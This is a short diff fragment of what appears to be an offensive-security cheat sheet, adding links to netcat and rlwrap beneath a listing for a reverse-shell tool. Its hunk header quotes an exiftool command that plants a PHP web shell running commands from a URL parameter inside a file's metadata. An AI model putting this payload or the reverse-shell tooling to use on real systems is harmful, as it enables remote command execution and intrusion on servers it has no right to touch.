@@ -416,3 +416,5 @@ exiftool -comment='<?php system($_GET['wr3nch']);?>' \<file_name\>.\<extension\>
   > Easy to remember reverse shell that should work on most Unix-like systems. <br>
   > Detects available software on the target and runs an appropriate payload.
   > ![](https://camo.githubusercontent.com/9ffdee4663ef22d343ebc88325a3f504e585669679942758485b215b1d7caa09/68747470733a2f2f692e696d6775722e636f6d2f71716a687841772e676966)
+- ## [netcat](https://github.com/diegocr/netcat)
+- ## [rlwrap](https://github.com/hanslub42/rlwrap)
